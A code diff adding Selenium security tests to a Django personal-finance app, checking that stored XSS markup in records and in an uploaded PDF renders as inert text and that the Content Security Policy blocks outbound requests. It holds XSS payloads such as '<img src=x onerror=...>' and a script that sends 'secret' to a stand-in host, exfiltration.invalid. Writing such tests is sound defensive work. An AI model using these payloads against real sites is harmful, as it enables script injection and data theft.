@@ -537,6 +537,149 @@ class DocumentReviewBrowserTests(StaticLiveServerTestCase):
         self.assertEqual(position["gain_loss"], .4)
         self._capture_browser_artifacts()
 
+    XSS_MARKUP = '<img src=x onerror="window.__alfredXss=(window.__alfredXss||0)+1">'
+
+    def _settle_and_read_xss_state(self):
+        """Give async image errors time to fire, then report what actually executed."""
+        self.selenium.execute_async_script("setTimeout(arguments[arguments.length-1], 1200)")
+        return self.selenium.execute_script(
+            "return {executed: window.__alfredXss || 0,"
+            " injected: document.querySelectorAll('img[src=\"x\" i], svg[onload]').length,"
+            " path: location.pathname}")
+
+    def _assert_last_import_panel_is_inert(self, expected_text):
+        self.selenium.get(f"{self.live_server_url}/expenses/")
+        self.wait.until(lambda driver: "Last import:" in driver.find_element(self.By.ID, "lastUploadMeta").text)
+        state = self._settle_and_read_xss_state()
+        # Each stage reports its own failure, so the file and PDF paths are proven separately.
+        with self.subTest(expected=expected_text):
+            self.assertEqual(state["executed"], 0, state)
+            self.assertEqual(state["injected"], 0, state)
+            self.assertIn(expected_text, self.selenium.find_element(self.By.ID, "lastUploadMeta").text)
+
+    def test_hostile_statement_metadata_renders_as_inert_text(self):
+        import fitz
+        from django.core.files.uploadedfile import SimpleUploadedFile
+
+        self._install_authenticated_session_cookie()
+        # A row saved before server-side validation must still render as plain text.
+        StatementUpload.objects.create(
+            user=self.user, source="<svg onload=__alfredXss=1>", file_name=self.XSS_MARKUP + ".pdf",
+            bank_name=self.XSS_MARKUP, institution_name=self.XSS_MARKUP, account_holder=self.XSS_MARKUP,
+            account_number=self.XSS_MARKUP, parser_status="needs_review", parse_confidence=0.4,
+        )
+        self._assert_last_import_panel_is_inert("<img src=x onerror=")
+
+        # The real path: markup inside a PDF, parsed and imported through the API.
+        # Stop the page's polling first: the live server shares this test's database connection.
+        self.selenium.get("about:blank")
+        StatementUpload.objects.filter(user=self.user).delete()
+        payload = "".join(f"&#{ord(char)};" for char in "window.__alfredXss=(1)")
+        with fitz.open() as document:
+            page = document.new_page(width=1400)
+            for index, line in enumerate(("HDFC BANK", f"MR <IMG SRC=X ONERROR={payload}>", "Account Number: 123456789012")):
+                page.insert_text((20, 60 + index * 20), line, fontsize=7)
+            raw = document.tobytes()
+        client = Client()
+        client.force_login(self.user)
+        response = client.post("/api/expenses/import-statement/", {
+            "statement": SimpleUploadedFile("ordinary-statement.pdf", raw, content_type="application/pdf")})
+        self.assertEqual(response.status_code, 201, response.content)
+        self._assert_last_import_panel_is_inert("ordinary-statement.pdf")
+
+        # A legitimate holder still displays exactly.
+        self.selenium.get("about:blank")
+        StatementUpload.objects.filter(user=self.user).delete()
+        StatementUpload.objects.create(user=self.user, source="bank_statement", file_name="Rahul & Sons (Jan).pdf",
+                                       account_holder="Anne-Marie D'Souza", account_number="123456789012",
+                                       parser_status="parsed", parse_confidence=0.9)
+        self._assert_last_import_panel_is_inert("Anne-Marie D'Souza")
+        panel = self.selenium.find_element(self.By.ID, "lastUploadMeta").text
+        self.assertIn("Rahul & Sons (Jan).pdf", panel)
+        self.assertIn("****9012", panel)
+        self.assertIn("bank statement", panel)
+
+    def test_hostile_records_stay_inert_and_pages_respect_csp(self):
+        from django.test import override_settings
+        from apps.expenses.models import BankAccount, Expense
+        from apps.family.models import Dependent
+        from apps.investments.models import Investment
+
+        markup = self.XSS_MARKUP
+        short_markup = "<img src=x onerror=__alfredXss=1>"
+        self.user.first_name = markup
+        self.user.city = markup
+        self.user.save(update_fields=["first_name", "city"])
+        account = BankAccount.objects.create(user=self.user, bank_name=markup, nickname=markup, account_holder=markup,
+                                             account_number="12345678", current_balance=Decimal("1000"))
+        for day in (1, 2, 3):
+            Expense.objects.create(user=self.user, bank_account=account, amount=Decimal("100"), category="shopping",
+                                   classification="expense", direction="debit", transaction_date=date(2026, 3, day),
+                                   merchant=markup, description=markup, raw_description=markup,
+                                   company_name=markup, counterparty=markup, external_reference=short_markup)
+        StatementUpload.objects.create(user=self.user, bank_account=account, source="bank_statement", file_name=markup + ".pdf",
+                                       account_holder=markup, bank_name=markup, institution_name=markup,
+                                       parser_status="needs_review", parse_confidence=0.4, extracted_payload={
+                                           "parser_notes": markup, "raw_text_excerpt": markup,
+                                           "accepted_corrections": {"account_holder": markup},
+                                           "extraction_review": {"field_candidates": [{
+                                               "field_type": "holder", "field_name": "account_holder", "label": markup,
+                                               "value": markup, "context": markup, "source": markup}]}})
+        Loan.objects.create(user=self.user, loan_type="home", lender=markup, loan_account_number=short_markup,
+                            principal=Decimal("100000"), interest_rate=9, emi=Decimal("2000"), tenure_months=60,
+                            remaining_balance=Decimal("90000"), start_date=date(2025, 1, 1), notes=markup)
+        Investment.objects.create(user=self.user, asset_type="equity", asset_name=markup, institution=markup,
+                                  account_number="1", invested_amount=Decimal("100"), current_value=Decimal("150"), notes=markup)
+        Dependent.objects.create(user=self.user, name=short_markup, age=5, relation=short_markup)
+        # A failed or slow API must not pass as "nothing executed": these pages must show the text.
+        must_render = {"/expenses/", "/loans/", "/investments/", "/documents/"}
+
+        pages = ("/dashboard/", "/expenses/", "/budgets/", "/loans/", "/investments/", "/family/", "/career/",
+                 "/behavioral/", "/relationship/", "/risk/", "/mobility/", "/bike-service/", "/credit-score/",
+                 "/recommendations/", "/tax-optimizer/", "/documents/", "/settings/", "/ai/insights/", "/admin/login/")
+        quotas = dict(ALFRED_API_ACCOUNT_LIMIT=10 ** 6, ALFRED_API_GLOBAL_LIMIT=10 ** 6,
+                      ALFRED_EXPENSIVE_ACCOUNT_LIMIT=10 ** 6, ALFRED_EXPENSIVE_GLOBAL_LIMIT=10 ** 6)
+        unsafe, csp_refused, csp_report_only = [], [], {}
+        with override_settings(**quotas):
+            self._install_authenticated_session_cookie()
+            self.selenium.get_log("browser")
+            for path in pages:
+                self.selenium.get(f"{self.live_server_url}{path}")
+                if path in must_render:
+                    self.wait.until(lambda driver: "<img src=x" in driver.find_element(self.By.TAG_NAME, "body").text, path)
+                state = self._settle_and_read_xss_state()
+                if state["executed"] or state["injected"]:
+                    unsafe.append(state)
+                for entry in self.selenium.get_log("browser"):
+                    message = entry.get("message", "")
+                    if "Content Security Policy" not in message and "Content-Security-Policy" not in message:
+                        continue
+                    if "Report Only" in message or "report-only" in message.lower():
+                        csp_report_only[path] = csp_report_only.get(path, 0) + 1
+                    else:
+                        csp_refused.append((path, message[:200]))
+            # The enforced policy must actually stop data leaving the page.
+            self.selenium.get(f"{self.live_server_url}/expenses/")
+            self.selenium.get_log("browser")
+            self.selenium.execute_async_script(
+                "const done = arguments[arguments.length-1];"
+                "new Image().src = 'https://exfiltration.invalid/pixel.png?secret=1';"
+                "fetch('https://exfiltration.invalid/collect', {method: 'POST', body: 'secret'})"
+                ".catch(() => {}).finally(() => setTimeout(done, 300));")
+            blocked = [entry["message"] for entry in self.selenium.get_log("browser")
+                       if "exfiltration.invalid" in entry.get("message", "")
+                       and "Content Security Policy" in entry["message"] and "Report Only" not in entry["message"]]
+        report_dir = os.environ.get("ALFRED_SEC01_REPORT_DIR")
+        if report_dir:
+            Path(report_dir).mkdir(parents=True, exist_ok=True)
+            (Path(report_dir) / "csp-page-sweep.json").write_text(json.dumps({
+                "pages": pages, "unsafe": unsafe, "csp_refused": csp_refused,
+                "csp_report_only": csp_report_only}, indent=2), encoding="utf-8")
+        self.assertEqual(unsafe, [])
+        self.assertEqual(csp_refused, [])
+        self.assertTrue(any("img-src" in message for message in blocked), blocked)
+        self.assertTrue(any("connect-src" in message for message in blocked), blocked)
+
     def _create_unknown_statement_upload(self):
         return StatementUpload.objects.create(
             user=self.user,
